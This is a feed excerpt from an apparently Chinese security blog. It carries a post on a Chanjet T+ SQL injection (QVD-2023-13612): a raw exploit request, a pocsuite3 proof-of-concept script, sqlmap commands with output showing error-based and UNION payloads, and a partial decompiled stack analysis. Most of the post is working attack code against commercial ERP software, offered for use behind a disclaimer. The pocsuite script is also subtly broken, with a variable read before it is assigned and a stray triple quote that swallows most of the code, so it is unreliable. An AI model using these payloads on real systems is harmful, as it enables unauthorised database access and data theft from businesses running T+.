href="https://developer.aliyun.com/article/1348505#:~:text=%E5%A6%82%E4%BD%95%E5%9C%A8Windows%E6%9C%AC%E5%9C%B0%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BASFTP%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E5%B9%B6%E9%80%9A%E8%BF%87%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E5%AE%9E%E7%8E%B0%E5%85%AC%E7%BD%91%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%201%201.%20%E6%90%AD%E5%BB%BASFTP%E6%9C%8D%E5%8A%A1%E5%99%A8%201.1%20%E4%B8%8B%E8%BD%BD%20freesshd%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BD%AF%E4%BB%B6%20%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80%EF%BC%9A,%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8A%E8%AE%BF%E9%97%AEcpolar%E7%9A%84%E5%AE%98%E7%BD%91%EF%BC%8C%E5%85%8D%E8%B4%B9%E6%B3%A8%E5%86%8C%E4%B8%80%E4%B8%AA%E8%B4%A6%E5%8F%B7%EF%BC%8C%E7%84%B6%E5%90%8E%E4%B8%8B%E8%BD%BD%E5%B9%B6%E5%AE%89%E8%A3%85windows%E7%89%88%E6%9C%AC%E7%9A%84cpolar%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E3%80%82%20...%204%204.%20%E4%BD%BF%E7%94%A8SFTP%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%8C%E8%BF%9E%E6%8E%A5%E5%85%AC%E7%BD%91%E5%9C%B0%E5%9D%80%E6%B5%8B%E8%AF%95%204.1%20%E6%B7%BB%E5%8A%A0%E6%96%B0%E7%AB%99%E7%82%B9%20">如何在Windows本地快速搭建SFTP文件服务器，并通过端口映射实现公网远程访问-阿里云开发者社区</a></li><li></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：用户本地搭建 SFTP 的小工具。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="G_工具" scheme="http://example.com/categories/G-%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>【QVD-2023-13612】畅捷通T+ SQL 注入漏洞</title>
    <link href="http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/</id>
    <published>2024-04-07T00:22:33.512Z</published>
    <updated>2024-05-08T03:19:37.036Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：畅捷通T+ SQL 注入漏洞(含POC)</p></blockquote><span id="more"></span><p><strong>免责声明：本文所涉及的信息安全技术知识仅供参考</strong>和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。<strong>读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。</strong></p><p>[toc]</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/image-20240418160447555.png" class="" title="image-20240418160447555"><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>畅捷通T+SQL注入漏洞，未经身份认证的远程攻击者可在易受攻击系统上执行任意SQL语句，某些情况下攻击者利用该漏洞可在底层操作系统上执行shell命令。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>畅捷通T+ 13.0</p><p>畅捷通T+ 16.0</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1</span><br><span class="line">Host: 192.168.19.137:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/css,*/*;q=0.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 53</span><br><span class="line"></span><br><span class="line">&#123;&quot;accNum&quot;: &quot;3&#x27;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span><br></pre></td></tr></table></figure><h4 id="使用-pocsuit"><a href="#使用-pocsuit" class="headerlink" title="使用 pocsuit"></a>使用 pocsuit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> OrderedDict, OptString</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChanJetPOC</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span class="line">    vulID = <span class="string">&#x27;0&#x27;</span>  <span class="comment"># ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0</span></span><br><span class="line">    version = <span class="string">&#x27;1&#x27;</span>  <span class="comment"># 默认为1</span></span><br><span class="line">    author = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># PoC作者的大名</span></span><br><span class="line">    vulDate = <span class="string">&#x27;2022-09-23&#x27;</span>  <span class="comment"># 漏洞公开的时间,不知道就写今天</span></span><br><span class="line">    createDate = <span class="string">&#x27;2022-09-23&#x27;</span>  <span class="comment"># 编写 PoC 的日期</span></span><br><span class="line">    updateDate = <span class="string">&#x27;2022-09-23&#x27;</span>  <span class="comment"># PoC 更新的时间,默认和编写时间一样</span></span><br><span class="line">    references = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># 漏洞地址来源,0day不用写</span></span><br><span class="line">    name = <span class="string">&#x27;畅捷通T+ SQL上传&#x27;</span>  <span class="comment"># PoC 名称</span></span><br><span class="line">    appPowerLink = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 漏洞厂商主页地址</span></span><br><span class="line">    appName = <span class="string">&#x27;畅捷通T+&#x27;</span>  <span class="comment"># 漏洞应用名称</span></span><br><span class="line">    appVersion = <span class="string">&#x27;&#x27;&#x27;13.0 &lt;= 畅捷通T+单机版&lt;=16.0且使用IIS10.0以下版本&#x27;&#x27;&#x27;</span>  <span class="comment"># 漏洞影响版本</span></span><br><span class="line">    vulType = VUL_TYPE.UPLOAD_FILES  <span class="comment"># 漏洞类型,类型参考见 漏洞类型规范表</span></span><br><span class="line">    desc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        CNVD-2022-60632 畅捷通T+ SQL漏洞</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 漏洞简要描述</span></span><br><span class="line">    samples = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># 测试样列,就是用 PoC 测试成功的网站</span></span><br><span class="line">    install_requires = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写</span></span><br><span class="line">    pocDesc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    category = POC_CATEGORY.EXPLOITS.REMOTE</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.url.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">            path = <span class="string">&quot;tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            path = <span class="string">&quot;/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex&quot;</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.url.startswith(<span class="string">&#x27;http://&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> url.startswith(<span class="string">&#x27;https://&#x27;</span>):</span><br><span class="line">            url = <span class="string">&#x27;http://&#x27;</span> + self.url</span><br><span class="line">        url = self.url + path</span><br><span class="line">        headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">        data = <span class="string">&#x27;&#x27;&#x27;&#123;&quot;accNum&quot;: &quot;3&#x27;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span></span><br><span class="line"><span class="string">        # data = &#x27;&#x27;&#x27;</span>&#123;<span class="string">&quot;accNum&quot;</span>: <span class="string">&quot;3&#x27; AND (select )-- NCab&quot;</span>, <span class="string">&quot;functionTag&quot;</span>: <span class="string">&quot;SYS0104&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        print(f&quot;数据: &#123;data&#125;&quot;)</span></span><br><span class="line"><span class="string">        print(f&quot;扫描目标: &#123;url&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        try:</span></span><br><span class="line"><span class="string">            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span></span><br><span class="line"><span class="string">            repData =requests.post(url, headers=headers, data=data, timeout=1000, verify=False)</span></span><br><span class="line"><span class="string">            print(f&quot;响应: &#123;repData.text&#125;&quot;)</span></span><br><span class="line"><span class="string">            if &quot;Microsoft SQL Server&quot; in repData.text and &quot;error&quot; not in repData.text:</span></span><br><span class="line"><span class="string">            #if repData.status_code == 200:</span></span><br><span class="line"><span class="string">                result[&#x27;VerifyInfo&#x27;] = &#123;&#125;</span></span><br><span class="line"><span class="string">                result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = url </span></span><br><span class="line"><span class="string">                result[&#x27;VerifyInfo&#x27;][&#x27;message&#x27;] = repData.text</span></span><br><span class="line"><span class="string">                result[&#x27;VerifyInfo&#x27;][&#x27;shell&#x27;] = self.url + &#x27;/tplus/UFAQD/InitServerInfo.aspx?preload=1&#x27;                </span></span><br><span class="line"><span class="string">        except Exception as e:</span></span><br><span class="line"><span class="string">            print(e)</span></span><br><span class="line"><span class="string">            return</span></span><br><span class="line"><span class="string">        return self.parse_output(result)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def _attack(self):</span></span><br><span class="line"><span class="string">        return self._verify()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def parse_attack(self, result):</span></span><br><span class="line"><span class="string">        output = Output(self)</span></span><br><span class="line"><span class="string">        if result:</span></span><br><span class="line"><span class="string">            output.success(result)</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            output.fail(&#x27;target is not vulnerable&#x27;)</span></span><br><span class="line"><span class="string">        return output</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def _shell(self):</span></span><br><span class="line"><span class="string">        return</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def parse_output(self, result):</span></span><br><span class="line"><span class="string">        output = Output(self)</span></span><br><span class="line"><span class="string">        if result:</span></span><br><span class="line"><span class="string">            output.success(result)</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            output.fail(&#x27;target is not vulnerable&#x27;)</span></span><br><span class="line"><span class="string">        return output</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">register_poc(ChanJetPOC)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>使用 pocsuit 执行上述 poc 结果如下所示：</p><style>.iybnxsgndojm{zoom:80%;}</style><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/image-20240407082635186.png" class="iybnxsgndojm" alt="POC 执行结果"><p>可以看到执行的 POC 为 <code>&#123;&quot;accNum&quot;: &quot;3&#39;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</code> ，查询语句为 <code>select @@version</code> ，并且查询返回了 SQL Server 的版本为 <code>Microsoft SQL Server 2022 (RTM)……</code>。</p><h3 id="使用-SqlMap-检测"><a href="#使用-SqlMap-检测" class="headerlink" title="使用 SqlMap 检测"></a>使用 SqlMap 检测</h3><p>根据上述 POC 编写 sqlmap 的检测文件。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># sql.txt</span><br><span class="line">POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/css,*/*;q=0.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 53</span><br><span class="line"></span><br><span class="line">&#123;&quot;accNum&quot;: &quot;3&#x27;&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span><br></pre></td></tr></table></figure><p>使用 sqlmap 执行上述检测文件，如果为 sqlmap 不熟悉，可以参考这篇文章：<a href="https://blog.csdn.net/weixin_43819747/article/details/136736688">【SQL注入】Sqlmap使用指南(手把手保姆版)持续更新_web union sql 注入 测试工具-CSDN博客</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r sql.txt --random-agent -v <span class="number">3</span> --dbms mssql --hex -p &quot;accNum&quot; --batch</span><br></pre></td></tr></table></figure><p>这里对上述执行命令稍加说明：</p><p><code>-r</code>: 指定从文件中加载 http 请求</p><p><code>--random-agent</code>：使用随机选择的HTTP User-Agent头部值</p><p><code>-v</code>: 详细级别: 0-6（默认为1）</p><p><code>--dbms</code>: 指定是数据库名</p><p><code>--hex</code>: 在数据检索过程中使用十六进制转换</p><p><code>-p</code>: 可测试的参数</p><p><code>--batch</code>: 不要询问用户输入,使用默认行为</p><p>运行完上述命令之后就会生成 sql 漏洞相关注入点，以畅捷通 SQL 漏洞为例，输出如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: JSON accNum ((custom) POST)</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)</span><br><span class="line">    Payload: &#123;&quot;accNum&quot;: &quot;3&#x27; AND 3159 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(107)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (3159=3159) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(113)+CHAR(113)))-- zxmb&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span><br><span class="line">    Vector: AND [RANDNUM] IN (SELECT (&#x27;[DELIMITER_START]&#x27;+([QUERY])+&#x27;[DELIMITER_STOP]&#x27;))</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 22 columns</span><br><span class="line">    Payload: &#123;&quot;accNum&quot;: &quot;3&#x27; UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(120)+CHAR(107)+CHAR(106)+CHAR(113)+CHAR(72)+CHAR(103)+CHAR(87)+CHAR(72)+CHAR(115)+CHAR(109)+CHAR(84)+CHAR(82)+CHAR(117)+CHAR(65)+CHAR(80)+CHAR(105)+CHAR(112)+CHAR(84)+CHAR(81)+CHAR(66)+CHAR(116)+CHAR(120)+CHAR(73)+CHAR(103)+CHAR(106)+CHAR(79)+CHAR(71)+CHAR(102)+CHAR(80)+CHAR(110)+CHAR(104)+CHAR(75)+CHAR(113)+CHAR(116)+CHAR(82)+CHAR(114)+CHAR(112)+CHAR(117)+CHAR(82)+CHAR(104)+CHAR(89)+CHAR(105)+CHAR(114)+CHAR(73)+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(113)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- nhDS&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span><br><span class="line">    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]</span><br><span class="line">---</span><br><span class="line">web server operating system: Windows</span><br><span class="line">web application technology: Nginx 1.16.1, ASP.NET, ASP.NET 4.0.30319</span><br><span class="line">back-end DBMS: Microsoft SQL Server 2022</span><br></pre></td></tr></table></figure><p>以下是【文心一言】对上述结果的解读：</p><blockquote><p>SQLMap 的输出显示了它已识别到的 SQL 注入点，并提供了详细的注入类型和对应的 payload。这是它自动检测到的潜在安全漏洞。</p><p>以下是关于输出的一些解释：</p><ol><li>注入点信息<ul><li><strong>参数</strong>：<code>JSON accNum</code> 是一个 JSON 格式的 POST 请求参数，它是 SQL 注入的入口点。</li><li>类型<ul><li><strong>error-based</strong>：基于错误的注入类型，它利用数据库错误消息来推断 SQL 查询的结构。</li><li><strong>UNION query</strong>：UNION 查询注入类型，它利用 SQL 的 UNION 语句来合并多个查询结果。</li></ul></li></ul></li><li>Payload<ul><li>Payload 是 SQLMap 构造的恶意输入，用于触发 SQL 注入并提取信息。例如，<code>3&#39; AND 3159 IN (SELECT ...</code> 就是一个用于触发基于错误的注入的 payload。</li></ul></li><li>Vector<ul><li>Vector 是 SQLMap 使用的注入模板，用于构造具体的 payload。</li></ul></li><li>Web 服务器操作系统和技术<ul><li>SQLMap 还识别了目标服务器的操作系统（Windows）以及使用的 web 技术（Nginx 1.16.1, ASP.NET, ASP.NET 4.0.30319）。</li></ul></li><li>后端数据库管理系统<ul><li>识别出的后端数据库是 Microsoft SQL Server 2022。</li></ul></li></ol><p>根据这些信息，您可以进一步分析目标系统的安全性，并考虑采取适当的措施来修复这些 SQL 注入漏洞。这可能包括更新或修补应用程序代码、使用参数化查询或预编译的语句来防止 SQL 注入，以及限制对数据库的访问权限等。</p><p>请注意，在实际环境中，一旦发现了 SQL 注入漏洞，您应该立即通知相关的系统管理员或安全团队，并避免未经授权地访问或利用这些漏洞。</p></blockquote><h2 id="堆栈分析"><a href="#堆栈分析" class="headerlink" title="堆栈分析"></a>堆栈分析</h2><h4 id="SQL-执行堆栈"><a href="#SQL-执行堆栈" class="headerlink" title="SQL 执行堆栈"></a>SQL 执行堆栈</h4><p>SQL 执行函数：</p><p>ExecuteReader 执行的 SQL 注入的参数：</p><p>“select id,UseLogID,Acaa_Num,UserID,UserName,PersonName,Url,HostAddress,HostName,FunctionTag,FunctionName,BeginTime,State,Version,Description,TaskID,ModelClassType,ModelType,ClientType,ServerAddress from EAP_Mutex with(nolock) where userid &lt;&gt;  N’’ and Acaa_Num &#x3D;  N’6’and (select @@version)&gt;0– N’ and  Version &#x3D; ‘YWTPro N’ order by begintime”</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">System.Data.dll!System.Data.SqlClient.SqlCommand.ExecuteReader(System.Data.CommandBehavior behavior, <span class="built_in">string</span> method) (IL=<span class="number">0x0000</span>, Native=<span class="number">0x00007FF928E40F90</span>+<span class="number">0x37</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原型</span></span><br><span class="line"><span class="comment">// Token: 0x060019A2 RID: 6562 RVA: 0x000B587C File Offset: 0x000B4C7C</span></span><br><span class="line"><span class="function"><span class="keyword">internal</span> SqlDataReader <span class="title">ExecuteReader</span>(<span class="params">CommandBehavior behavior, <span class="built_in">string</span> method</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    SqlConnection.ExecutePermission.Demand();</span><br><span class="line">    <span class="keyword">this</span>._pendingCancel = <span class="literal">false</span>;</span><br><span class="line">    SqlStatistics statistics = <span class="literal">null</span>;</span><br><span class="line">    TdsParser target = <span class="literal">null</span>;</span><br><span class="line">    RuntimeHelpers.PrepareConstrainedRegions();</span><br><span class="line">    <span class="built_in">bool</span> success = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">int</span>? sqlExceptionNumber = <span class="literal">null</span>;</span><br><span class="line">    SqlDataReader result;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.WriteBeginExecuteEvent();</span><br><span class="line">        target = SqlInternalConnection.GetBestEffortCleanupTarget(<span class="keyword">this</span>._activeConnection);</span><br><span class="line">        statistics = SqlStatistics.StartTimer(<span class="keyword">this</span>.Statistics);</span><br><span class="line">        SqlDataReader sqlDataReader = <span class="keyword">this</span>.RunExecuteReader(behavior, RunBehavior.ReturnImmediately, <span class="literal">true</span>, method);</span><br><span class="line">        success = <span class="literal">true</span>;</span><br><span class="line">        result = sqlDataReader;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (SqlException ex)</span><br><span class="line">    &#123;</span><br><span class="line">        sqlExceptionNumber = <span class="keyword">new</span> <span class="built_in">int</span>?(ex.Number);</span><br><span class="line">        <span class="keyword">throw</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (OutOfMemoryException e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>._activeConnection.Abort(e);</span><br><span class="line">        <span class="keyword">throw</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (StackOverflowException e2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>._activeConnection.Abort(e2);</span><br><span class="line">        <span class="keyword">throw</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ThreadAbortException e3)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>._activeConnection.Abort(e3);</span><br><span class="line">        SqlInternalConnection.BestEffortCleanup(target);</span><br><span class="line">        <span class="keyword">throw</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span></span><br><span class="line">    &#123;</span><br><span class="line">        SqlStatistics.StopTimer(statistics);</span><br><span class="line">        <span class="keyword">this</span>.WriteEndExecuteEvent(success, sqlExceptionNumber, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="漏洞堆栈"><a href="#漏洞堆栈" class="headerlink" title="漏洞堆栈"></a>漏洞堆栈</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 